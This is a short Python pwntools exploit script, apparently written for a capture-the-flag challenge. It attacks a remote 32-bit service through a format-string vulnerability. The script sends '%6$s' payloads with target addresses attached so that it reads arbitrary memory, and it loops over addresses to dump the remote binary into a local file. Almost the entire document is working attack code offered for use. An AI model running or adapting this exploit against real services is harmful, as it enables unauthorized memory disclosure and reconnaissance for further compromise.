#!/usr/bin/env python
import sys, os
from pwn import *

log.warning('Usage: ./exp.py [HOST] [PORT]')
#prog = os.path.dirname(os.path.abspath(__file__)).split('/')[-1]
#elf = ELF(prog)
#if not elf: log.warning('Cannot open ' + prog)
#libc = ELF('libc.so.6') if len(sys.argv) > 2 else elf.libc
#if not libc: log.warning('Cannot open libc.so.6')
HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
context.word_size = 32

def leak_addr(addr, ref=False):
    exp = '%6$p' if ref else '%6$s'
    exp = exp.ljust(8, '\x00') + p32(addr)
    r.sendline(exp)
    r.recvuntil('bytes\n')
    leak = r.recv(timeout=1)
    return leak

def leak_elf(base=0x400000):
    global r
    progress = log.progress('base')
    while True:
        r = remote(HOST, PORT)
        buf = ''
        try:
            while True:
                if base & 0xff == 0xa:
                    buf += '\x00'; base += 1
                progress.status(hex(base))
                leak = leak_addr(base)
                if len(leak) > 0:
                    buf += leak
                    base += len(leak)
                else:
                    buf += '\x00'
                    base += 1
        except:
            open('./elf', 'ab').write(buf)


def leak(buf):
    r.sendline(buf)
    r.recvuntil('bytes\n')
    return r.recvline()


r = None
leak_elf(int(sys.argv[3], 16))

#r = remote(HOST, PORT)
#off = 260
#exp = ''.join(['%{}$p:'.format(i) for i in range(off, off+50)])
#print leak(exp).split(':')
#print leak_addr(0x08048000)


r.interactive()
